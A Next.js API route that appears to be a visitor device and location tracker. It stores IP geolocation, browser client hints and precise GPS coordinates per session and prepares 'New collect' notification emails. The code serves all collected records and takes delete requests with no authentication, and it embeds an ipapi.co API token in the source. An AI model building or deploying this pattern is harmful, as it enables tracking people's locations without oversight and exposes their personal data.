import { type NextRequest, NextResponse } from "next/server"
import { sendNotificationEmail } from "@/lib/email"
import { promises as fs } from "fs"
import path from "path"

// Store data in-memory per session. Keyed by sessionId
const sessionData: Map<string, any> = new Map()

function getDataFilePath() {
  return path.join(process.cwd(), "data.json")
}

function getBackupFilePath() {
  return path.join(process.cwd(), "data_backup.json")
}

async function readPersistedSessions(): Promise<Record<string, any>> {
  try {
    const filePath = getDataFilePath()
    const content = await fs.readFile(filePath, "utf8").catch(() => "")
    if (!content) return {}
    const parsed = JSON.parse(content)
    if (parsed && typeof parsed === "object") return parsed as Record<string, any>
    return {}
  } catch {
    return {}
  }
}

async function writePersistedSessions(data: Record<string, any>): Promise<void> {
  const filePath = getDataFilePath()
  const json = JSON.stringify(data, null, 2)
  await fs.writeFile(filePath, json, "utf8")
}

async function readBackupSessions(): Promise<Record<string, any>> {
  try {
    const filePath = getBackupFilePath()
    const content = await fs.readFile(filePath, "utf8").catch(() => "")
    if (!content) return {}
    const parsed = JSON.parse(content)
    if (parsed && typeof parsed === "object") return parsed as Record<string, any>
    return {}
  } catch {
    return {}
  }
}

async function writeBackupSessions(data: Record<string, any>): Promise<void> {
  const filePath = getBackupFilePath()
  const json = JSON.stringify(data, null, 2)
  await fs.writeFile(filePath, json, "utf8")
}

async function getLocationFromIP(ip: string) {
  try {
    // Using ipapi.co for detailed IP geolocation (free, no API key required)
    const response = await fetch(`https://ipapi.co/${ip}/json?token=8808e6c456f6e2`, {
      headers: {
        "User-Agent": "DeviceTracker/1.0",
      },
    })

    if (response.ok) {
      const data = await response.json()

      // Check if we got an error response
      if (data.error) {
        console.error("IP API error:", data.reason)
        return null
      }

      return {
        ip: data.ip || ip,
        city: data.city || "Unknown",
        region: data.region || "Unknown",
        regionCode: data.region_code || "Unknown",
        country: data.country_name || "Unknown",
        countryCode: data.country_code || "Unknown",
        countryCapital: data.country_capital || "Unknown",
        latitude: data.latitude || null,
        longitude: data.longitude || null,
        timezone: data.timezone || "Unknown",
        isp: data.org || "Unknown",
        asn: data.asn || "Unknown",
        postal: data.postal || "Unknown",
        continentCode: data.continent_code || "Unknown",
        fullLocation: `${data.country_name || "Unknown"} / ${data.region || "Unknown"} / ${data.city || "Unknown"}`,
      }
    } else {
      console.error("IP API response not OK:", response.status, response.statusText)
    }
  } catch (error) {
    console.error("Error fetching IP location:", error)
  }
  return null
}

export async function POST(request: NextRequest) {
  try {
    const deviceInfo = await request.json()

    // Determine or create a sessionId and persist it via cookie
    const existingCookieSessionId = request.cookies.get("sessionId")?.value
    const sessionId = deviceInfo.sessionId || existingCookieSessionId || crypto.randomUUID()
    deviceInfo.sessionId = sessionId

    const ip = request.headers.get("x-forwarded-for")?.split(",")[0] || request.headers.get("x-real-ip") || "unknown"
    const serverUA = request.headers.get("user-agent") || "unknown"
    // UA-CH headers can be quoted strings due to Structured Headers; strip quotes
    const stripQuotes = (v: string | null) => (v ? v.replace(/^"|"$/g, "") : null)
    const uaModelRaw = request.headers.get("sec-ch-ua-model")
    const uaPlatformRaw = request.headers.get("sec-ch-ua-platform")
    const uaPlatformVersionRaw = request.headers.get("sec-ch-ua-platform-version")
    const uaFullVersionListRaw = request.headers.get("sec-ch-ua-full-version-list")
    let uaModel = stripQuotes(uaModelRaw)
    const uaPlatform = stripQuotes(uaPlatformRaw)
    const uaPlatformVersion = stripQuotes(uaPlatformVersionRaw)
    const uaFullVersionList = stripQuotes(uaFullVersionListRaw)

    // Server-side log: visible in the terminal where Next.js runs
    console.log("[/api/collect] incoming payload", {
      sessionId,
      locationType: deviceInfo.locationType,
      clientUA: deviceInfo.userAgent,
      serverUA,
      ip,
      hasGPS: Boolean(deviceInfo.gpsLocation),
      uaModel,
      uaPlatform,
      uaPlatformVersion,
      uaFullVersionList,
    })

    if (sessionId && deviceInfo.locationType === "gps-precise") {
      // Merge GPS data into existing session data if available
      const existing = sessionData.get(sessionId)
      if (existing) {
        existing.gpsLocation = deviceInfo.gpsLocation
        existing.locationType = "gps-precise"
        sessionData.set(sessionId, existing)
        // Persist to file as well
        try {
          const persisted = await readPersistedSessions()
          persisted[sessionId] = existing
          await writePersistedSessions(persisted)
        } catch (persistErr) {
          console.error("Failed to persist GPS update:", persistErr)
        }
        const response = NextResponse.json({ success: true, message: "GPS location updated" })
        if (!existingCookieSessionId) {
          response.cookies.set("sessionId", sessionId, { httpOnly: true, sameSite: "lax", path: "/", maxAge: 60 * 60 * 24 * 7 })
        }
        return response
      } else {
        console.log("No existing session found, creating new entry with GPS data")
      }
    }

    // Fallback: if header model is empty, use client-provided uaHints.model if present
    if (!uaModel && (deviceInfo as any)?.uaHints?.model) {
      uaModel = String((deviceInfo as any).uaHints.model)
    }

    // Attach UA-CH fields to payload for persistence/visibility (normalized)
    if (uaModel !== null && uaModel !== undefined) (deviceInfo as any).uaModel = uaModel
    if (uaPlatform) (deviceInfo as any).uaPlatform = uaPlatform
    if (uaPlatformVersion) (deviceInfo as any).uaPlatformVersion = uaPlatformVersion
    if (uaFullVersionList) (deviceInfo as any).uaFullVersionList = uaFullVersionList

    if (ip && ip !== "unknown") {
      const locationData = await getLocationFromIP(ip)
      if (locationData) {
        deviceInfo.location = locationData   } else {
        console.log("Failed to fetch location data, adding IP only")
        deviceInfo.location = {
          ip: ip,
          city: "Unknown",
          region: "Unknown",
          regionCode: "Unknown",
          country: "Unknown",
          countryCode: "Unknown",
          countryCapital: "Unknown",
          latitude: null,
          longitude: null,
          timezone: "Unknown",
          isp: "Unknown",
          asn: "Unknown",
          postal: "Unknown",
          continentCode: "Unknown",
          fullLocation: "Location data unavailable",
        }
      }
    } else {
      console.log("IP is unknown, cannot fetch location")
      deviceInfo.location = {
        ip: "Unknown (localhost/preview)",
        city: "Unknown",
        region: "Unknown",
        regionCode: "Unknown",
        country: "Unknown",
        countryCode: "Unknown",
        countryCapital: "Unknown",
        latitude: null,
        longitude: null,
        timezone: "Unknown",
        isp: "Unknown",
        asn: "Unknown",
        postal: "Unknown",
        continentCode: "Unknown",
        fullLocation: "Location unavailable (localhost/preview environment)",
      }
    }

    // Save/overwrite data for this session only (memory)
    sessionData.set(sessionId, deviceInfo)
    // Persist to file
    try {
      const persisted = await readPersistedSessions()
      persisted[sessionId] = deviceInfo
      await writePersistedSessions(persisted)
    } catch (persistErr) {
      console.error("Failed to persist session data:", persistErr)
    }

    try {
      const subject = `New collect: ${deviceInfo.deviceName || deviceInfo.userAgent || "Unknown Device"}`
      const lines: string[] = []
      lines.push(`Timestamp: ${deviceInfo.timestamp || new Date().toISOString()}`)
      lines.push(`Session: ${deviceInfo.sessionId || "n/a"}`)
      lines.push(`Type: ${deviceInfo.locationType || "n/a"}`)
      if (deviceInfo.location) {
        lines.push(
          `Location: ${deviceInfo.location.fullLocation || `${deviceInfo.location.country || "Unknown"} / ${deviceInfo.location.region || "Unknown"} / ${deviceInfo.location.city || "Unknown"}`}`,
        )
        lines.push(`IP: ${deviceInfo.location.ip || "Unknown"}`)
        if (deviceInfo.location.latitude && deviceInfo.location.longitude) {
          lines.push(`Coords: ${deviceInfo.location.latitude}, ${deviceInfo.location.longitude}`)
        }
      }
      if (deviceInfo.gpsLocation) {
        lines.push(
          `GPS: lat=${deviceInfo.gpsLocation.latitude}, lon=${deviceInfo.gpsLocation.longitude}, acc=${deviceInfo.gpsLocation.accuracy}`,
        )
      }
      lines.push(`UA: ${deviceInfo.userAgent || "Unknown"}`)

      // For development purposes, we don't want to send emails
      // await sendNotificationEmail({
      //   subject,
      //   text: lines.join("\n"),
      //   html: `<pre>${lines.map((l: string) => l.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")).join("\n")}</pre>`,
      // })
    } catch (emailError) {
      console.error("Failed to send notification email:", emailError)
    }

    const response = NextResponse.json({ success: true, message: "Data collected", sessionId })
    if (!existingCookieSessionId) {
      response.cookies.set("sessionId", sessionId, { httpOnly: true, sameSite: "lax", path: "/", maxAge: 60 * 60 * 24 * 7 })
    }
    return response
  } catch (error) {
    console.error("Error saving data:", error)
    return NextResponse.json({ success: false, error: "Failed to save data" }, { status: 500 })
  }
}

export async function GET(request: NextRequest) {
  try {
    // Return ALL sessions as an array for admin UI compatibility
    // Start with persisted data from disk
    const persisted = await readPersistedSessions()
    const combined: Record<string, any> = { ...persisted }
    // Overlay in-memory (newest wins)
    for (const [sid, value] of sessionData.entries()) {
      combined[sid] = value
    }
    const list = Object.values(combined)
    return NextResponse.json({ success: true, data: list })
  } catch (error) {
    console.error("Error reading data:", error)
    return NextResponse.json({ success: false, error: "Failed to read data" }, { status: 500 })
  }
}

export async function DELETE(request: NextRequest) {
  try {
    // Support either query param or JSON body for sessionId
    const { searchParams } = new URL(request.url)
    let sessionId = searchParams.get("sessionId") || undefined
    if (!sessionId) {
      try {
        const body = await request.json().catch(() => null)
        if (body && typeof body === "object" && body.sessionId) {
          sessionId = String(body.sessionId)
        }
      } catch {
        // ignore
      }
    }

    if (!sessionId) {
      return NextResponse.json({ success: false, error: "sessionId is required" }, { status: 400 })
    }

    // Load current persisted sessions
    const persisted = await readPersistedSessions()
    const record = persisted[sessionId]

    if (!record && !sessionData.has(sessionId)) {
      return NextResponse.json({ success: false, error: "Session not found" }, { status: 404 })
    }

    // Prefer persisted record; if absent, try in-memory
    const dataToArchive = record || sessionData.get(sessionId)

    // Write to backup file (append/move)
    const backup = await readBackupSessions()
    backup[sessionId] = dataToArchive
    await writeBackupSessions(backup)

    // Remove from primary storage (both persisted and memory)
    if (persisted[sessionId]) {
      delete persisted[sessionId]
      await writePersistedSessions(persisted)
    }
    if (sessionData.has(sessionId)) {
      sessionData.delete(sessionId)
    }

    return NextResponse.json({ success: true, message: "Session archived", sessionId })
  } catch (error) {
    console.error("Error deleting session:", error)
    return NextResponse.json({ success: false, error: "Failed to delete session" }, { status: 500 })
  }
}
